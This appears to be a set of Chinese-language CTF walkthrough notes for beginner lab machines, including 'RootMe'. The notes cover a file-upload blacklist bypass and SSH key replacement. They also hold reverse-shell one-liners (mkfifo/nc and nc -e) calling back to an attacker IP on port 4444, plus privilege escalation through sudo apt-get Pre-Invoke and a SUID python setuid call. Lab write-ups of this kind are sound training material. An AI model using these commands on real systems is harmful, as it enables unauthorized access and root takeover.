rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.133 4444 >/tmp/f

该账户没有权限查看 /home/jake 目录下的文件，上传 linpeas.sh 来查看有无利用点

这个是将公钥替换成私钥

所以可以将自己的公钥替换它的公钥，这样我们就可以无密码登录 jake 了

用自己的公钥来替换

echo "ssh-rsa AAAAB3Nza..." > /opt/.backups/jake_id_rsa.pub.backup

apt-get 有无密码权限，该命令支持通过 -o 调用外部命令，让它在更新前直接执行 /bin/bash，就可以提权了

sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"

RootMe

A ctf for beginners, can you root me?

端口扫描，开启了 22，80 端口，访问网站没有有用信息

扫目录得到一个 /panel，访问是一个文件上传页面

但是不能上传 php

可以上传 jpg，但是修改头文件以及其他参数都不行

猜测是黑名单，修改后缀为 php5 成功上传

查找带有 SUID 权限的文件，找到一个 python2

find / -type f -user root -perm -u=s 2> /dev/null

由于这个是 shell 是在 web 上，没法提权，刚好靶机有 nc ，但是没有 -e 参数，所以用其他利用方式反弹

nc 192.168.140.133 4444 -e /bin/bash 
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.133 4444 >/tmp/f

因为 python2.7 有 SUID root 权限，运行它时，会以 root 身份执行，用 os.setuid(0) 强行把用户 ID 设为 0（root），再启动 bash 拿到 root 权限

python -c 'import os; os.setuid(0); os.system("/bin/bash")'
